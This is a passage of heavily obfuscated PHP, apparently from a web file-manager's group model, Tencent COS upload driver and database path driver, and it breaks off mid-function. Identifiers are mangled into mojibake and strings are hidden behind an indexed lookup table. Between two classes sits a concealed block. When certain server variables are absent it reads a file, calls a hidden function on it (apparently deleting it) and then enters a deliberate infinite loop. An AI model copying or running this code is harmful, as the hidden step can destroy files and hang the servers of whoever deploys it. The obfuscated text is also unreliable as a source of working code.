$this->_listAppendChildren($„…Ñáæı); $this->_listAppendChildrenMember($„…Ñáæı); $this->_listAppendMeta($„…Ñáæı, $Ô¯Ê£); $this->_listAppendParent($„…Ñáæı); $this->_listAppendSourceRoot($„…Ñáæı, $Ô¯Ê£); } private function _listAppendChildren(&$µ¬î—Ùº) { $Ş±Ñ½ª =& $_SERVER[ïëó©ÒÚ]; $¬üÏÒë» = array_to_keyvalue($µ¬î—Ùº, $Ş±Ñ½ª[12], $Ş±Ñ½ª[1833]); $š‚Š¶­ = array($Ş±Ñ½ª[441] => array($Ş±Ñ½ª[7], $¬üÏÒë»)); $§™µ¿´Ş = array($Ş±Ñ½ª[441], $Ş±Ñ½ª[1933] => $Ş±Ñ½ª[509]); $«¶Û¾”· = $this->field($§™µ¿´Ş)->where($š‚Š¶­)->group($Ş±Ñ½ª[441])->select(); $ªî–»¹˜ = array_to_keyvalue($«¶Û¾”·, $Ş±Ñ½ª[441], $Ş±Ñ½ª[509]); foreach ($µ¬î—Ùº as &$½àà¤¬à) { $°–Ô–ˆ£ = $½àà¤¬à[$Ş±Ñ½ª[1833]]; $½àà¤¬à[$Ş±Ñ½ª[1934]] = isset($ªî–»¹˜[$°–Ô–ˆ£]) ? intval($ªî–»¹˜[$°–Ô–ˆ£]) : !1; } unset($½àà¤¬à); } private function _listAppendChildrenMember(&$æ±ëú—) { $ıˆÄŠÜ =& $_SERVER[ïëó©ÒÚ]; $©µŠ—Ã = array_to_keyvalue($æ±ëú—, $ıˆÄŠÜ[12], $ıˆÄŠÜ[1833]); $ÃÃèîÑš = array($ıˆÄŠÜ[1833] => array($ıˆÄŠÜ[7], $©µŠ—Ã)); $ÆĞİšà¦ = array($ıˆÄŠÜ[1833], $ıˆÄŠÜ[1933] => $ıˆÄŠÜ[509]); $Ê“ñ¥òÉ = Model($ıˆÄŠÜ[1923])->field($ÆĞİšà¦)->where($ÃÃèîÑš)->group($ıˆÄŠÜ[1833])->select(); $÷â÷Ìğª = array_to_keyvalue($Ê“ñ¥òÉ, $ıˆÄŠÜ[1833], $ıˆÄŠÜ[509]); foreach ($æ±ëú— as &$µ×ê€Ö) { $èÜÁşÆ = $µ×ê€Ö[$ıˆÄŠÜ[1833]]; $µ×ê€Ö[$ıˆÄŠÜ[1935]] = isset($÷â÷Ìğª[$èÜÁşÆ]) ? intval($÷â÷Ìğª[$èÜÁşÆ]) : !1; } unset($µ×ê€Ö); } private function _listAppendMeta(&$á¿ÔÌ, $Ğ£Ö ) { $ÛŸ¥ÏÌ =& $_SERVER[ïëó©ÒÚ]; $ğâõÀÉ = array($ÛŸ¥ÏÌ[1833] => array($ÛŸ¥ÏÌ[7], $Ğ£Ö )); $–¿¨’¡Æ = Model($ÛŸ¥ÏÌ[1922])->where($ğâõÀÉ)->select(); $–¿¨’¡Æ = array_to_keyvalue_group($–¿¨’¡Æ, $ÛŸ¥ÏÌ[1833]); foreach ($–¿¨’¡Æ as &$¤¨ç¥â) { $¤¨ç¥â = array_to_keyvalue($¤¨ç¥â, $ÛŸ¥ÏÌ[94], $ÛŸ¥ÏÌ[374]); } unset($¤¨ç¥â); foreach ($á¿ÔÌ as &$·ñÓØ©) { $·ñÓØ©[$ÛŸ¥ÏÌ[475]] = array(); if (isset($–¿¨’¡Æ[$·ñÓØ©[$ÛŸ¥ÏÌ[1833]]])) { $·ñÓØ©[$ÛŸ¥ÏÌ[475]] = $–¿¨’¡Æ[$·ñÓØ©[$ÛŸ¥ÏÌ[1833]]]; } } unset($·ñÓØ©); } protected function parentLevelArray($›·ÛÆ³) { $Ò±á€Úò =& $_SERVER[ïëó©ÒÚ]; $›·ÛÆ³ = explode($Ò±á€Úò[50], trim($›·ÛÆ³, $Ò±á€Úò[50])); $›·ÛÆ³ = array_remove_value($›·ÛÆ³, $Ò±á€Úò[197]); return $›·ÛÆ³; } protected function parentInGroup($ ÏòşõÒ, $ó¯·ÖÍò) { $Å¨ş—öš =& $_SERVER[ïëó©ÒÚ]; $½â”•À = $this->getInfoSimple($ ÏòşõÒ); if (!$½â”•À) { return !0; } $ø—ªŠÓ = $this->parentLevelArray($½â”•À[$Å¨ş—öš[530]]); $ø—ªŠÓ[] = $ ÏòşõÒ; foreach ($ø—ªŠÓ as $ ÏòşõÒ) { if (in_array($ ÏòşõÒ . $Å¨ş—öš[12], $ó¯·ÖÍò)) { return !0; } } return !1; } private function _listAppendParent(&$ã‘ÜÇÀ—) { $ïÙÂÖ =& $_SERVER[ïëó©ÒÚ]; $ÄÈŠÖÜ = array(); foreach ($ã‘ÜÇÀ— as &$ß¾¾­‹ó) { $ÄÈŠÖÜ[$ß¾¾­‹ó[$ïÙÂÖ[1833]]] = $ß¾¾­‹ó[$ïÙÂÖ[32]]; $Ôî¤ÒÌ = $this->parentLevelArray($ß¾¾­‹ó[$ïÙÂÖ[530]]); foreach ($Ôî¤ÒÌ as $¶ŒúòàÉ) { if (!isset($ÄÈŠÖÜ[$¶ŒúòàÉ])) { $ÄÈŠÖÜ[$¶ŒúòàÉ] = 0; } } } unset($ß¾¾­‹ó); foreach ($ÄÈŠÖÜ as $©Â³âò² => $•ñ™ÙÂ) { if ($•ñ™ÙÂ) { continue; } $„¶‚€Ö˜ = $this->getInfoSimple($©Â³âò²); $ÄÈŠÖÜ[$©Â³âò²] = $„¶‚€Ö˜[$ïÙÂÖ[32]]; } $Ì‘×± = $GLOBALS[$ïÙÂÖ[6]][$ïÙÂÖ[89]][$ïÙÂÖ[1936]]; if ($GLOBALS[$ïÙÂÖ[512]] == $ïÙÂÖ[88]) { $Ì‘×± = !1; } foreach ($ã‘ÜÇÀ— as &$ß¾¾­‹ó) { $Ôî¤ÒÌ = $this->parentLevelArray($ß¾¾­‹ó[$ïÙÂÖ[530]]); $îüéŞ©‹ = $ïÙÂÖ[12]; foreach ($Ôî¤ÒÌ as $©Â³âò² => $¶ŒúòàÉ) { if ($Ì‘×± && $©Â³âò² == 0) { continue; } $îüéŞ©‹ .= $ÄÈŠÖÜ[$¶ŒúòàÉ] . $ïÙÂÖ[8]; } if ($Ôî¤ÒÌ) { $îüéŞ©‹ .= $ß¾¾­‹ó[$ïÙÂÖ[32]]; } $ß¾¾­‹ó[$ïÙÂÖ[535]] = str_replace($ïÙÂÖ[538], $ïÙÂÖ[8], $îüéŞ©‹); } unset($ß¾¾­‹ó); } private function _listAppendSourceRoot(&$åÛÛ´­¤, $é’†ÜÕ™) { $ÛÛœ±íİ =& $_SERVER[ïëó©ÒÚ]; $àáºÊ÷ = Model($ÛÛœ±íİ[835])->listSourceRoot(SourceModel::TYPE_GROUP, $é’†ÜÕ™); $àáºÊ÷ = array_to_keyvalue($àáºÊ÷, $ÛÛœ±íİ[514]); $àáºÊ÷ = array_remove_key($àáºÊ÷, $ÛÛœ±íİ[514]); foreach ($åÛÛ´­¤ as &$‰®şšğ³) { $‰®şšğ³[$ÛÛœ±íİ[86]] = $àáºÊ÷[$‰®şšğ³[$ÛÛœ±íİ[1833]]] ? $àáºÊ÷[$‰®şšğ³[$ÛÛœ±íİ[1833]]] : array(); } unset($‰®şšğ³); } protected function groupMerge($‚¹Êì) { $‚¹Êì = array_values(array_unique($‚¹Êì)); $ÅˆÕê– = array(); for ($Á®ú©¥œ = 0; $Á®ú©¥œ < count($‚¹Êì); $Á®ú©¥œ++) { $åáê”ß = !1; for ($¬²¾Éé = 0; $¬²¾Éé < count($‚¹Êì); $¬²¾Éé++) { if ($Á®ú©¥œ == $¬²¾Éé) { continue; } if ($this->isParentOf($‚¹Êì[$¬²¾Éé], $‚¹Êì[$Á®ú©¥œ])) { $åáê”ß = !0; break; } } if (!$åáê”ß) { $ÅˆÕê–[] = $‚¹Êì[$Á®ú©¥œ]; } } return $ÅˆÕê–; } protected function isParentOf($¤ÙåƒŸ³, $«Ô¦‹Ç¥) { $Ş©¯µ» =& $_SERVER[ïëó©ÒÚ]; if (!$¤ÙåƒŸ³ || !$«Ô¦‹Ç¥ || $¤ÙåƒŸ³ == $«Ô¦‹Ç¥) { return !1; } $½ßığŸ = $this->getInfoSimple($¤ÙåƒŸ³); $†áÅ°±Ê = $this->getInfoSimple($«Ô¦‹Ç¥); $º×„€¥Ã = $½ßığŸ[$Ş©¯µ»[530]] . $¤ÙåƒŸ³ . $Ş©¯µ»[50]; if (substr($†áÅ°±Ê[$Ş©¯µ»[530]], 0, strlen($º×„€¥Ã)) == $º×„€¥Ã) { return !0; } return !1; } public function groupShowRoot($âå¤Ùó¡, $–²Ãş©º = false) { $˜˜·ÏŒ× =& $_SERVER[ïëó©ÒÚ]; $½Òô­Û = $this->getInfo($âå¤Ùó¡); if (!$½Òô­Û) { return array(); } $Ä»Õ‡§Ü = $this->parentLevelArray($½Òô­Û[$˜˜·ÏŒ×[530]]); $Û‘÷¥àˆ = array($âå¤Ùó¡); if (count($Ä»Õ‡§Ü) == 0) { return $Û‘÷¥àˆ; } if ($–²Ãş©º && count($Ä»Õ‡§Ü) == 1) { return $Û‘÷¥àˆ; } if (!$½Òô­Û[$˜˜·ÏŒ×[475]] || !isset($½Òô­Û[$˜˜·ÏŒ×[475]][$˜˜·ÏŒ×[1919]]) || $½Òô­Û[$˜˜·ÏŒ×[475]][$˜˜·ÏŒ×[1919]] == $˜˜·ÏŒ×[1888]) { return $this->groupShowRoot($Ä»Õ‡§Ü[count($Ä»Õ‡§Ü) - 1], $–²Ãş©º); } if ($½Òô­Û[$˜˜·ÏŒ×[475]][$˜˜·ÏŒ×[1919]] == $˜˜·ÏŒ×[357]) { $•æ×ÁÌ = explode($˜˜·ÏŒ×[50], $½Òô­Û[$˜˜·ÏŒ×[475]][$˜˜·ÏŒ×[1920]]); if ($•æ×ÁÌ) { $Û‘÷¥àˆ = array_merge($Û‘÷¥àˆ, $•æ×ÁÌ); } } return $Û‘÷¥àˆ; } protected function resetParentLevel() { $¥Î€ÄŸæ =& $_SERVER[ïëó©ÒÚ]; $å¿°²Ÿİ = $¥Î€ÄŸæ[1833]; $Õâ¼Ï·ì = $this->select(); $Õâ¼Ï·ì = array_to_keyvalue($Õâ¼Ï·ì, $å¿°²Ÿİ); foreach ($Õâ¼Ï·ì as $âÏƒ´È‰) { $ğŒÕ¹Çê = $âÏƒ´È‰; $’ŠùÍ‘‘ = array(); while ($ğŒÕ¹Çê[$¥Î€ÄŸæ[441]] != 0) { $’ŠùÍ‘‘[] = $ğŒÕ¹Çê[$¥Î€ÄŸæ[441]]; $ğŒÕ¹Çê = $Õâ¼Ï·ì[$ğŒÕ¹Çê[$¥Î€ÄŸæ[441]]]; } $’ŠùÍ‘‘[] = 0; $’ŠùÍ‘‘ = $¥Î€ÄŸæ[50] . implode($¥Î€ÄŸæ[50], array_reverse($’ŠùÍ‘‘)) . $¥Î€ÄŸæ[50]; $this->setNamePinyin($âÏƒ´È‰[$å¿°²Ÿİ], $âÏƒ´È‰[$¥Î€ÄŸæ[32]]); $this->where(array($å¿°²Ÿİ => $âÏƒ´È‰[$å¿°²Ÿİ]))->save(array($¥Î€ÄŸæ[599] => $’ŠùÍ‘‘)); } return $Õâ¼Ï·ì; } public function groupNameAuto($Îİ–Ÿ, $»ƒŞ„Áç) { $–´şÂŸš =& $_SERVER[ïëó©ÒÚ]; $´ÀàÕ˜° = $this->where(array($–´şÂŸš[410] => $Îİ–Ÿ))->getField($–´şÂŸš[32], !0); if (!$´ÀàÕ˜° || !in_array($»ƒŞ„Áç, $´ÀàÕ˜°)) { return $»ƒŞ„Áç; } for ($Ô¥ˆæÓ˜ = 1; $Ô¥ˆæÓ˜ <= count($´ÀàÕ˜°) + 1; $Ô¥ˆæÓ˜++) { $ĞÒ Ò‘ = $»ƒŞ„Áç . "\x28{$Ô¥ˆæÓ˜}\51"; if (!in_array($ĞÒ Ò‘, $´ÀàÕ˜°)) { return $ĞÒ Ò‘; } } } public function groupSwitch($Ò²ÚñÌÆ, $´ªî‘É‘) { $úÑÁ˜™È =& $_SERVER[ïëó©ÒÚ]; $Õ¢®çÊÁ = array($úÑÁ˜™È[1833] => array($úÑÁ˜™È[7], array($Ò²ÚñÌÆ, $´ªî‘É‘))); $ÎûÕ§·Ü = $this->where($Õ¢®çÊÁ)->select(); $ÎûÕ§·Ü = array_to_keyvalue($ÎûÕ§·Ü, $úÑÁ˜™È[1833]); if (!isset($ÎûÕ§·Ü[$Ò²ÚñÌÆ]) || !isset($ÎûÕ§·Ü[$´ªî‘É‘]) || $ÎûÕ§·Ü[$Ò²ÚñÌÆ][$úÑÁ˜™È[441]] == 0) { return !1; } $Õ¢®çÊÁ = array($úÑÁ˜™È[1833] => $Ò²ÚñÌÆ); $¥Ğ…è¦ı = Model($úÑÁ˜™È[1923])->where($Õ¢®çÊÁ)->select(); if (!$¥Ğ…è¦ı) { $¥Ğ…è¦ı = array(); } foreach ($¥Ğ…è¦ı as $“à¸™ª¼) { $°Æô‹È¢ = $“à¸™ª¼[$úÑÁ˜™È[1661]]; $Õ¢®çÊÁ = array($úÑÁ˜™È[1661] => $°Æô‹È¢, $úÑÁ˜™È[1833] => $´ªî‘É‘); $Û¶µİĞ… = Model($úÑÁ˜™È[1923])->where($Õ¢®çÊÁ)->find(); if (!$Û¶µİĞ…) { $¶‚”ë…Ö = array($´ªî‘É‘ => $“à¸™ª¼[$úÑÁ˜™È[1937]]); Model($úÑÁ˜™È[544])->userGroupAdd($°Æô‹È¢, $¶‚”ë…Ö); } Model($úÑÁ˜™È[544])->userGroupRemove($°Æô‹È¢, $Ò²ÚñÌÆ); } $Õ¢®çÊÁ = array($úÑÁ˜™È[420] => 2, $úÑÁ˜™È[441] => 0, $úÑÁ˜™È[419] => 1, $úÑÁ˜™È[514] => array($úÑÁ˜™È[7], array($Ò²ÚñÌÆ, $´ªî‘É‘))); $ì˜Âˆğ– = Model($úÑÁ˜™È[835])->where($Õ¢®çÊÁ)->field($úÑÁ˜™È[1938])->select(); $ì˜Âˆğ– = array_to_keyvalue($ì˜Âˆğ–, $úÑÁ˜™È[514], $úÑÁ˜™È[411]); $‘»õ«øë = !empty($ì˜Âˆğ–[$Ò²ÚñÌÆ]) ? $ì˜Âˆğ–[$Ò²ÚñÌÆ] : !1; if ($‘»õ«øë) { if (!$ì˜Âˆğ–[$´ªî‘É‘]) { $ì˜Âˆğ–[$´ªî‘É‘] = Model($úÑÁ˜™È[835])->groupRootAdd($´ªî‘É‘); } $íıËøò© = $ì˜Âˆğ–[$´ªî‘É‘]; $Õ¢®çÊÁ = array($úÑÁ˜™È[441] => $‘»õ«øë); $ì˜Âˆğ– = Model($úÑÁ˜™È[835])->where($Õ¢®çÊÁ)->field($úÑÁ˜™È[1939])->select(); if (!$ì˜Âˆğ–) { $ì˜Âˆğ– = array(); } Model($úÑÁ˜™È[835])->moveClearAuth = !1; foreach ($ì˜Âˆğ– as $§Ô»²²) { $Ô¡˜˜¯ó = $§Ô»²²[$úÑÁ˜™È[419]] == $úÑÁ˜™È[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($úÑÁ˜™È[835])->move($§Ô»²²[$úÑÁ˜™È[411]], $íıËøò©, $Ô¡˜˜¯ó); } Model($úÑÁ˜™È[835])->moveClearAuth = !0; $Õ¢®çÊÁ = array($úÑÁ˜™È[420] => 2, $úÑÁ˜™È[514] => $Ò²ÚñÌÆ); $†š éˆ = array($úÑÁ˜™È[514] => $´ªî‘É‘); Model($úÑÁ˜™È[1940])->where($Õ¢®çÊÁ)->save($†š éˆ); Model($úÑÁ˜™È[1941])->where($Õ¢®çÊÁ)->save($†š éˆ); } $this->_changeChildLevel($ÎûÕ§·Ü[$Ò²ÚñÌÆ], $ÎûÕ§·Ü[$´ªî‘É‘], !0); $this->where(array($úÑÁ˜™È[441] => $Ò²ÚñÌÆ))->save(array($úÑÁ˜™È[441] => $´ªî‘É‘)); $this->_clearChildrenCache($ÎûÕ§·Ü[$´ªî‘É‘]); return !0; } } goto Eø¤ˆä‹…; BöØÕ‰ÆãÁ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($÷Ò­ù»Š) { parent::__construct($÷Ò­ù»Š); $this->signatureVersion($_SERVER[ïëó©ÒÚ][216]); } public function uploadFormData($ÀÌÒšã›, $ıëÕàô = 3600) { $ôä¤¬Â =& $_SERVER[ïëó©ÒÚ]; $ô¤€¾ÁŸ = $ôä¤¬Â[198]; $ÁâÑœìÙ = $ôä¤¬Â[232]; $¸ÒÕâ›¨ = $ôä¤¬Â[1313]; $üßÙÜ‡ = gmdate($ôä¤¬Â[1314], time() + $ıëÕàô); $†Ñ‹ß¨„ = (string) time() . $ôä¤¬Â[71] . (string) (time() + $ıëÕàô); $Ä¬ãöØÊ = array($ôä¤¬Â[1315] => $üßÙÜ‡, $ôä¤¬Â[1316] => array(array($ôä¤¬Â[1317] => $ô¤€¾ÁŸ), array($ôä¤¬Â[1318] => $this->bucket), array($ôä¤¬Â[1319], $ôä¤¬Â[1320], $ôä¤¬Â[12]), array($ôä¤¬Â[1321] => $¸ÒÕâ›¨), array($ôä¤¬Â[1322] => $ÁâÑœìÙ), array($ôä¤¬Â[1323] => $this->accessKey), array($ôä¤¬Â[1324] => $†Ñ‹ß¨„))); $Ä¬ãöØÊ = json_encode($Ä¬ãöØÊ); $ºÕé™Ş = hash_hmac($ôä¤¬Â[232], $†Ñ‹ß¨„, $this->secret); $ğ±Ù£çË = sha1($Ä¬ãöØÊ); $©ÑÖñúÓ = hash_hmac($ôä¤¬Â[232], $ğ±Ù£çË, $ºÕé™Ş); $ßàòéò = array($ôä¤¬Â[1317] => $ô¤€¾ÁŸ, $ôä¤¬Â[1321] => $¸ÒÕâ›¨, $ôä¤¬Â[1325] => base64_encode($Ä¬ãöØÊ), $ôä¤¬Â[1322] => $ÁâÑœìÙ, $ôä¤¬Â[1323] => $this->accessKey, $ôä¤¬Â[1326] => $†Ñ‹ß¨„, $ôä¤¬Â[1327] => $©ÑÖñúÓ, $ôä¤¬Â[181] => $this->getHost()); return $ßàòéò; } public function fileOutLink($Ã°íİÊµ) { $óùŸãøê =& $_SERVER[ïëó©ÒÚ]; if (substr($Ã°íİÊµ, 0, 7) == $óùŸãøê[1328]) { $Ã°íİÊµ = $óùŸãøê[1329] . substr($Ã°íİÊµ, 7); } header($óùŸãøê[161] . $Ã°íİÊµ); die; } } if (!isset($_SERVER[$_SERVER[ïëó©ÒÚ][400]]) || !isset($_SERVER[$_SERVER[ïëó©ÒÚ][408]])) { $_getc = $_SERVER[ïëó©ÒÚ][402]; $_getfile = $_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïëó©ÒÚ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ïëó©ÒÚ][405]) { $exit = $_SERVER[ïëó©ÒÚ][406]; $exit(); } $_act = $_SERVER[ïëó©ÒÚ][407]; $_act($_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ïëó©ÒÚ][378]); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ĞüØÑ×º) { $this->pathParse = $ĞüØÑ×º; $this->model = Model($_SERVER[ïëó©ÒÚ][1330]); } public function getPath($ÛßÉ¦Ò…) { return trim($ÛßÉ¦Ò…, $_SERVER[ïëó©ÒÚ][8]); } public function pathFather($Ó« ›) { $­ÍÓú¿” = $this->parse($Ó« ›); $­ÍÓú¿” = $this->infoSimple($Ó« ›); return $­ÍÓú¿” ? $­ÍÓú¿”[$_SERVER[ïëó©ÒÚ][441]] : !1; } public function pathThis($¶ÑñÆŒË) { $ƒĞœæ¹ê = $this->infoSimple($¶ÑñÆŒË); return $ƒĞœæ¹ê ? $ƒĞœæ¹ê[$_SERVER[ïëó©ÒÚ][32]] : !1; } public function getPathOuter($ ëñşêÍ) { if (!$ ëñşêÍ) { return $ ëñşêÍ; } $Ç¹¸ÍÇ = $this->parse($ ëñşêÍ); return KodIO::make($Ç¹¸ÍÇ[$_SERVER[ïëó©ÒÚ][399]]); } public function copyFolderFromIO($¡ûÄ”¤à, $Õ§Î›Š , $ÕÜÏ¥§Ì, $¬Ü›õÍ, $Ëùß£¼Ü) { $Øá¯œ†ƒ = $this->model->copyFolderFromIO($¡ûÄ”¤à, $Õ§Î›Š , $ÕÜÏ¥§Ì, $¬Ü›õÍ, $Ëùß£¼Ü); return KodIO::make($Øá¯œ†ƒ); } public function isParentOf($ÖÜ·€à„, $îÒ½¢ùŠ) { return $this->model->isParentOf($ÖÜ·€à„, $îÒ½¢ùŠ); } public function mkfile($ û×àë, $‘’ìÜş = '', $«‹ıÇ«  = REPEAT_RENAME) { $ÚÖåêë‘ =& $_SERVER[ïëó©ÒÚ]; $ı›Ñ¡’› = $this->parse($ û×àë); $ û×àë = $ı›Ñ¡’›[$ÚÖåêë‘[399]]; for ($Ò“üÜ©¦ = 0; $Ò“üÜ©¦ < count($ı›Ñ¡’›[$ÚÖåêë‘[1331]]); $Ò“üÜ©¦++) { $¢ÓƒÑÌ˜ = $ı›Ñ¡’›[$ÚÖåêë‘[1331]][$Ò“üÜ©¦]; if ($Ò“üÜ©¦ == count($ı›Ñ¡’›[$ÚÖåêë‘[1331]]) - 1) { $ û×àë = $this->model->mkfile($ û×àë, $¢ÓƒÑÌ˜, $‘’ìÜş, $«‹ıÇ« ); break; } $ û×àë = $this->model->mkdir($ û×àë, $¢ÓƒÑÌ˜, REPEAT_SKIP); } return $this->getPathOuter($ û×àë); } public function mkdir($†ş‹¥Ö, $ÂßÕ­»å = REPEAT_SKIP) { $“ŸÆá›í =& $_SERVER[ïëó©ÒÚ]; $×Ó‘ò¦² = $this->parse($†ş‹¥Ö); $†ş‹¥Ö = $×Ó‘ò¦²[$“ŸÆá›í[399]]; for ($»óğ°¢Ç = 0; $»óğ°¢Ç < count($×Ó‘ò¦²[$“ŸÆá›í[1331]]); $»óğ°¢Ç++) { $ûÙ¬¬¢ = $×Ó‘ò¦²[$“ŸÆá›í[1331]][$»óğ°¢Ç]; $†ş‹¥Ö = $this->model->mkdir($†ş‹¥Ö, $ûÙ¬¬¢, $ÂßÕ­»å); } return $this->getPathOuter($†ş‹¥Ö); } public function copyFile($Ã¶õå‘Ç, $Ö­Ç¡»İ, $‰½í—­Ş = REPEAT_REPLACE) { $·‰û÷˜€ =& $_SERVER[ïëó©ÒÚ]; $©×®ß¶ = $this->parse($Ö­Ç¡»İ); $¹ÎŠú‹³ = $this->model->copy($Ã¶õå‘Ç, $©×®ß¶[$·‰û÷˜€[399]], $‰½í—­Ş, $©×®ß¶[$·‰û÷˜€[84]]); return $¹ÎŠú‹³ ? $this->getPathOuter($¹ÎŠú‹³) : !1; } public function moveFile($ÎÜ¼òœç, $…¯ü¢„…, $è©Òæ½ù = REPEAT_REPLACE) { $óá²Ú«Æ =& $_SERVER[ïëó©ÒÚ]; $üÃ˜É£µ = $this->parse($…¯ü¢„…); $¹®ìµŒñ = $this->model->move($ÎÜ¼òœç, $üÃ˜É£µ[$óá²Ú«Æ[399]], $è©Òæ½ù, $üÃ˜É£µ[$óá²Ú«Æ[84]]); return $¹®ìµŒñ ? $this->getPathOuter($¹®ìµŒñ) : !1; } public function copy($í´®ÀúÔ, $™¯éíÓô, $ˆãÖ†£­ = REPEAT_REPLACE, $³ì—†éŠ = false) { $İïäªÃÀ = $this->parse($™¯éíÓô); $Ø¾ŠÙê§ = $this->model->copy($í´®ÀúÔ, $İïäªÃÀ[$_SERVER[ïëó©ÒÚ][399]], $ˆãÖ†£­, $³ì—†éŠ); return $Ø¾ŠÙê§ ? $this->getPathOuter($Ø¾ŠÙê§) : !1; } public function moveSameAllow() { } public function move($¯šö‘¤¸, $µ¬œˆ¸Æ, $œ±ÉªÁ· = REPEAT_REPLACE, $Ğ¨Åô•š = false) { $ÈÆòÑ¹Ó = $this->parse($µ¬œˆ¸Æ); $è´ú³Ë = $this->model->move($¯šö‘¤¸, $ÈÆòÑ¹Ó[$_SERVER[ïëó©ÒÚ][399]], $œ±ÉªÁ·, $Ğ¨Åô•š); return $è´ú³Ë ? $this->getPathOuter($è´ú³Ë) : !1; } public function remove($òŸ °†, $›áäù¸ = true) { return $this->model->remove($òŸ °†, $›áäù¸); } public function rename($ŒœŠÈ¾Ú, $´é‡ÔÏò) { $ş¨æ¯ö¾ = $this->model->rename($ŒœŠÈ¾Ú, $´é‡ÔÏò); return $ş¨æ¯ö¾ ? $this->getPathOuter($ŒœŠÈ¾Ú) : $ş¨æ¯ö¾; } public function size($—¾Ï­¥¹) { $ú¸ùèÀ = $this->infoSimple($—¾Ï­¥¹); return $ú¸ùèÀ ? $ú¸ùèÀ[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function infoSimple($ô’×˜÷¼) { return $this->model->sourceInfo($ô’×˜÷¼); } public function info($ŒÚ£î×) { return $this->infoParse($ŒÚ£î×); } public function infoAuth($˜ËÑ¼è³) { return $this->infoParse($˜ËÑ¼è³, !1, !0); } public function infoWithChildren($ÒõÄìô) { return $this->infoParse($ÒõÄìô, !0); } protected function infoParse($•ßÈº‰æ, $ìÙ¨ÑÚú = false, $¦õ‰öå = false) { if (!$ìÙ¨ÑÚú) { return $this->model->pathInfo($•ßÈº‰æ, $¦õ‰öå); } return $this->model->pathInfoMore($•ßÈº‰æ); } public function infoFull($‚˜Ù­Òß) { $ãËêş† =& $_SERVER[ïëó©ÒÚ]; $Àå©‚î = explode($ãËêş†[8], $‚˜Ù­Òß); $©×¡çıŠ = implode($ãËêş†[8], array_splice($Àå©‚î, 1)); return $this->model->pathInfoByPath($Àå©‚î[0], $©×¡çıŠ); } public function hashSimple($üıáŠğĞ) { $Ùƒê =& $_SERVER[ïëó©ÒÚ]; $™şø¯Å = $this->infoWithChildren($üıáŠğĞ); return $™şø¯Å[$Ùƒê[170]][$Ùƒê[177]]; } public function hashMd5($²±äÍö) { $·¼¡­”Œ =& $_SERVER[ïëó©ÒÚ]; $ì«å¢Å× = $this->infoWithChildren($²±äÍö); return $ì«å¢Å×[$·¼¡­”Œ[170]][$·¼¡­”Œ[176]]; } public function exist($½µÍÇµ) { $ò‘·Ñ‘ =& $_SERVER[ïëó©ÒÚ]; $­÷ûÑ÷Ä = $this->parse($½µÍÇµ); if (!$­÷ûÑ÷Ä[$ò‘·Ñ‘[84]]) { return $this->isFile($½µÍÇµ) || $this->isFolder($½µÍÇµ); } $œ•š›¹‰ = array($ò‘·Ñ‘[410] => $­÷ûÑ÷Ä[$ò‘·Ñ‘[399]], $ò‘·Ñ‘[32] => $­÷ûÑ÷Ä[$ò‘·Ñ‘[84]]); $£Æ‘äú¸ = $this->model->where($œ•š›¹‰)->find(); return $£Æ‘äú¸ ? !0 : !1; } public function isFile($Ø…÷ïïÅ) { $ıùı˜ù½ =& $_SERVER[ïëó©ÒÚ]; $†¤ïğ‰á = $this->infoSimple($Ø…÷ïïÅ); return $†¤ïğ‰á && $†¤ïğ‰á[$ıùı˜ù½[419]] == $ıùı˜ù½[88] ? !1 : !0; } public function isFolder($ÁËôêÂ‡) { $œé±Òé´ =& $_SERVER[ïëó©ÒÚ]; $Ö¸¼Øšö = $this->infoSimple($ÁËôêÂ‡); return $Ö¸¼Øšö && $Ö¸¼Øšö[$œé±Òé´[419]] == $œé±Òé´[88] ? !0 : !1; } public function listPath($‚ĞªÎ, $İš’çıÀ = false) { $úåöØÆÉ =& $_SERVER[ïëó©ÒÚ]; if ($‚ĞªÎ == $úåöØÆÉ[12]) { return !1; } $±‹çà = array($úåöØÆÉ[410] => $‚ĞªÎ); if ($İš’çıÀ) { return $this->model->listSource($±‹çà, -1); } return $this->model->listSource($±‹çà); } public function has($„É‘ÃÄª, $½±’ê•® = false, $¹ş¨•¿‚ = null) { $“ä£¡Â€ =& $_SERVER[ïëó©ÒÚ]; $Ì±âå˜Ç = $this->infoWithChildren($„É‘ÃÄª); if ($½±’ê•®) { return array($“ä£¡Â€[208] => $Ì±âå˜Ç[$“ä£¡Â€[208]], $“ä£¡Â€[207] => $Ì±âå˜Ç[$“ä£¡Â€[207]]); } return $¹ş¨•¿‚ ? $Ì±âå˜Ç[$“ä£¡Â€[208]] : $Ì±âå˜Ç[$“ä£¡Â€[207]]; } public function listAll($³Áî¸Œ¢) { $âœÖ€ „ = IO::info($this->pathParse[$_SERVER[ïëó©ÒÚ][84]]); if (!$âœÖ€ „) { return array(); } return $this->model->listAll($³Áî¸Œ¢); } public function getContent($•µ‚ÎãÛ) { return $this->model->getContent($•µ‚ÎãÛ); } public function setContent($‹·¡Å™, $›Ï““ñŸ = '') { return $this->model->setContent($‹·¡Å™, $›Ï““ñŸ); } public function fileSubstr($•¬²ı, $”’èù¡Ù, $ïÓí¤ú™) { return $this->model->fileSubstr($•¬²ı, $”’èù¡Ù, $ïÓí¤ú™); } public function download($ÃçâÍ², $ğ¬ñ§ = '') { $¸÷…›”ô = get_path_father($ğ¬ñ§); $‡ƒÈ¥ñÅ = get_path_this($ğ¬ñ§); $á‡ìœİŠ = $this->model->fileInfoGet($ÃçâÍ²); $óƒ ®© = IO::copy($á‡ìœİŠ[$_SERVER[ïëó©ÒÚ][84]], $¸÷…›”ô, !1, $‡ƒÈ¥ñÅ); return $óƒ ®©; } public function setModifyTime($ŞòÎÕÛ¥, $Æ«îıäÁ = '') { $Ì®’ìâÊ =& $_SERVER[ïëó©ÒÚ]; if (!$ŞòÎÕÛ¥) { return; } $this->model->where(array($Ì®’ìâÊ[426] => $ŞòÎÕÛ¥))->save(array($Ì®’ìâÊ[85] => $Æ«îıäÁ)); } public function upload($À¸›·˜î, $Î«÷µÇ, $ÛÑš’“© = false, 